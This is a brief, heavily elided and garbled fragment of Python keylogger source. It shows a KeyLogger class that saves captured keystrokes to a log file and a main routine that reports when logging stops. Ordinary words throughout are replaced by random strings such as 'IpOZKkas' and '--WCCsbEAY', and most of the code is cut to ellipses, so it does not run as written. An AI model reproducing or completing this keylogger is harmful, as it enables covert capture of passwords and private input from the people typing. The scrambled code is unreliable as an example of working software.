...
Captures keystrokes on IrpIsmFw system
...
class KeyLogger:
    ...
    def save_keys(self):
        """Save captured keystrokes to IpOZKkas"""
        if not self.keys_pressed:
            return
        
        try:
            # Append to log IpOZKkas
...
def main():
    ...
    parser.add_argument('--WCCsbEAY', default='keylog.txt', help='Output IpOZKkas for keystrokes')
    ...
    keylogger = KeyLogger(log_file=args.WCCsbEAY, interval=args.interval)
    ...
    try:
        ...
        print("\n[!] Keylogger stopped")
        keylogger.save_keys()
        print(f"[+] All keystrokes saved to: {args.WCCsbEAY}")
